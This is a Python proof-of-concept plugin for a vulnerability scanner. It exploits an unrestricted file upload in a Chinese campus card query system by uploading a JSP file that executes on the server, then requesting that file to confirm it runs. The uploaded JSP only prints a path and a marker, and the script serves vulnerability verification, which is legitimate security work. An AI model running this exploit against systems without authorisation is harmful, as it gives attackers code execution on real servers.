# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import time

class Vuln(ABVuln):
    vuln_id = 'JLYKT_0000' # 平台漏洞编号，留空
    name = '金龙卡金融化一卡通校园卡查询系统任意文件上传' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2014-12-10'  # 漏洞公布时间
    desc = '''
        http://xxx.xxx.xxx/pages/xxfb/editor/uploadAction.action
        post:
        <input name="file" value="浏览" id="file" type="file">
        可上传文件,未限制上传文件类型,导致任意文件上传漏洞。 
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=075840' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '金龙一卡通系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8e9b2b04-3717-44bd-8fe6-502dfedce9ce'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '{target}'.format(target=self.target)
            target_url = '{target}'.format(target=self.target) + "/pages/xxfb/editor/uploadAction.action"
            file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
            <%@ page import="java.io.*"%>
            <%
            String path=application.getRealPath(request.getRequestURI());
            File d=new File(path);
            out.println(path);
            %>
            <% out.println("0a12184d25062e5f");%>
            '''

            files = {'file': ('payload.jsp', file_v_jsp, 'text/plain')}
            response = requests.post(target_url, files=files) # 上传
            content = response.content

            regular = re.compile('/noticespic/.*jsp')
            url_back = regular.findall(content)
            

            if url_back:
                verify_url = verify_url+url_back[0]
                time.sleep(5) #不加会出错哦，可能是上一个上传还没完成，就去请求的时候导致数据出错了
                req = requests.get(verify_url)
                content = req.content
                if '0a12184d25062e5f' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()